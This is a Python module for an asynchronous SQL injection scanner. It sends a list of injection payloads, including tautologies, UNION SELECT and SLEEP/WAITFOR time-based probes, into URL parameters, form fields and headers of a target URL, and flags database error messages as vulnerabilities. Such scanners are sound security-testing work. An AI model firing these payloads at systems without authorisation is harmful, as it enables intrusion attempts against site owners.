import aiohttp
import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode
import logging

logger = logging.getLogger(__name__)

class SQLInjectionScanner:
    def __init__(self):
        self.payloads = [
            # Basic SQL injection payloads
            "'",
            "''",
            "`",
            "``",
            ",",
            "\"",
            "\"\"",
            "#",
            "-- -",
            "--",
            "/*",
            "*/",
            "/*!",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' OR 'a'='a",
            "' OR 'a'='a' --",
            "' OR 'a'='a' /*",
            
            # Union-based payloads
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,2,3,4,5 --",
            "' UNION ALL SELECT 1,2,3 --",
            
            # Error-based payloads
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' AND SLEEP(5) --",
            "' AND BENCHMARK(1000000,MD5('A')) --",
            
            # Blind SQL injection
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' WAITFOR DELAY '00:00:05' --",
            
            # Time-based payloads
            "' OR SLEEP(5) --",
            "' OR BENCHMARK(1000000,MD5('A')) --",
            
            # Boolean-based payloads
            "' OR 1=1 --",
            "' OR 1=2 --",
            "' AND 1=1 --",
            "' AND 1=2 --"
        ]
        
        self.error_patterns = [
            r"mysql_fetch_array",
            r"mysql_num_rows",
            r"mysql_fetch_assoc",
            r"mysql_fetch_row",
            r"mysql_result",
            r"You have an error in your SQL syntax",
            r"Warning: mysql",
            r"Microsoft OLE DB Provider for SQL Server",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_",
            r"ORA-\d{5}",
            r"Oracle error",
            r"Microsoft Access Driver",
            r"JET Database Engine",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"Warning.*sqlite",
            r"Warning.*SQLite3",
            r"Unclosed quotation mark",
            r"Unclosed.*quotation",
            r"Quoted string not properly terminated",
            r"SQL syntax.*MySQL",
            r"Syntax error.*SQL",
            r"Unexpected end of command in SQL statement"
        ]

    async def scan(self, url):
        """Comprehensive SQL injection scanning"""
        vulnerabilities = []
        
        try:
            # Test URL parameters
            url_vulns = await self._test_url_parameters(url)
            vulnerabilities.extend(url_vulns)
            
            # Test form parameters
            form_vulns = await self._test_form_parameters(url)
            vulnerabilities.extend(form_vulns)
            
            # Test headers
            header_vulns = await self._test_headers(url)
            vulnerabilities.extend(header_vulns)
            
        except Exception as e:
            logger.error(f"SQL injection scan failed: {str(e)}")
        
        return vulnerabilities

    async def _test_url_parameters(self, url):
        """Test URL parameters for SQL injection"""
        vulnerabilities = []
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param in query_params:
            for payload in self.payloads:
                test_params = query_params.copy()
                test_params[param] = [payload]
                
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
                
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(test_url, timeout=10) as response:
                            content = await response.text()
                            
                            if self._detect_sql_errors(content):
                                vulnerabilities.append({
                                    'title': 'SQL Injection Vulnerability',
                                    'description': f'SQL injection detected in parameter: {param}',
                                    'severity': 'critical',
                                    'evidence': {
                                        'parameter': param,
                                        'payload': payload,
                                        'url': test_url,
                                        'response_code': response.status
                                    },
                                    'recommendation': 'Use parameterized queries and input validation',
                                    'cvss_score': 9.8
                                })
                                break
                                
                except Exception as e:
                    continue
        
        return vulnerabilities

    async def _test_form_parameters(self, url):
        """Test form parameters for SQL injection"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as response:
                    content = await response.text()
                    
                    # Extract forms from page
                    forms = self._extract_forms(content)
                    
                    for form in forms:
                        form_action = form.get('action', url)
                        form_method = form.get('method', 'get').lower()
                        form_inputs = form.get('inputs', {})
                        
                        for input_name in form_inputs:
                            for payload in self.payloads[:10]:  # Test with first 10 payloads
                                test_data = form_inputs.copy()
                                test_data[input_name] = payload
                                
                                try:
                                    if form_method == 'post':
                                        async with session.post(form_action, data=test_data, timeout=10) as form_response:
                                            form_content = await form_response.text()
                                            
                                            if self._detect_sql_errors(form_content):
                                                vulnerabilities.append({
                                                    'title': 'SQL Injection Vulnerability (Form)',
                                                    'description': f'SQL injection detected in form parameter: {input_name}',
                                                    'severity': 'critical',
                                                    'evidence': {
                                                        'parameter': input_name,
                                                        'payload': payload,
                                                        'form_action': form_action,
                                                        'method': form_method
                                                    },
                                                    'recommendation': 'Use parameterized queries and input validation for all form inputs',
                                                    'cvss_score': 9.8
                                                })
                                                break
                                    else:
                                        # Handle GET forms
                                        query_string = urlencode(test_data)
                                        test_url = f"{form_action}?{query_string}"
                                        async with session.get(test_url, timeout=10) as form_response:
                                            form_content = await form_response.text()
                                            
                                            if self._detect_sql_errors(form_content):
                                                vulnerabilities.append({
                                                    'title': 'SQL Injection Vulnerability (Form)',
                                                    'description': f'SQL injection detected in form parameter: {input_name}',
                                                    'severity': 'critical',
                                                    'evidence': {
                                                        'parameter': input_name,
                                                        'payload': payload,
                                                        'url': test_url
                                                    },
                                                    'recommendation': 'Use parameterized queries and input validation for all form inputs',
                                                    'cvss_score': 9.8
                                                })
                                                break
                                                
                                except Exception as e:
                                    continue
                                    
        except Exception as e:
            logger.error(f"Form testing failed: {str(e)}")
        
        return vulnerabilities

    async def _test_headers(self, url):
        """Test HTTP headers for SQL injection"""
        vulnerabilities = []
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP']
        
        try:
            async with aiohttp.ClientSession() as session:
                for header in headers_to_test:
                    for payload in self.payloads[:5]:  # Test with first 5 payloads
                        test_headers = {header: payload}
                        
                        async with session.get(url, headers=test_headers, timeout=10) as response:
                            content = await response.text()
                            
                            if self._detect_sql_errors(content):
                                vulnerabilities.append({
                                    'title': 'SQL Injection Vulnerability (Header)',
                                    'description': f'SQL injection detected in header: {header}',
                                    'severity': 'high',
                                    'evidence': {
                                        'header': header,
                                        'payload': payload
                                    },
                                    'recommendation': 'Validate and sanitize all HTTP headers',
                                    'cvss_score': 8.2
                                })
                                break
                                
        except Exception as e:
            logger.error(f"Header testing failed: {str(e)}")
        
        return vulnerabilities

    def _detect_sql_errors(self, content):
        """Detect SQL errors in response content"""
        content_lower = content.lower()
        
        for pattern in self.error_patterns:
            if re.search(pattern, content_lower, re.IGNORECASE):
                return True
        
        return False

    def _extract_forms(self, html_content):
        """Extract forms from HTML content"""
        forms = []
        
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html_content, 'html.parser')
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': {}
                }
                
                # Extract input fields
                for input_tag in form.find_all('input'):
                    input_name = input_tag.get('name')
                    if input_name:
                        form_data['inputs'][input_name] = input_tag.get('value', '')
                
                # Extract textarea fields
                for textarea in form.find_all('textarea'):
                    textarea_name = textarea.get('name')
                    if textarea_name:
                        form_data['inputs'][textarea_name] = textarea.get_text()
                
                # Extract select fields
                for select in form.find_all('select'):
                    select_name = select.get('name')
                    if select_name:
                        first_option = select.find('option')
                        if first_option:
                            form_data['inputs'][select_name] = first_option.get('value', '')
                
                forms.append(form_data)
                
        except Exception as e:
            logger.error(f"Form extraction failed: {str(e)}")
        
        return forms

# Create scanner instance
scanner = SQLInjectionScanner()

# Async scan function
async def scan(url):
    return await scanner.scan(url)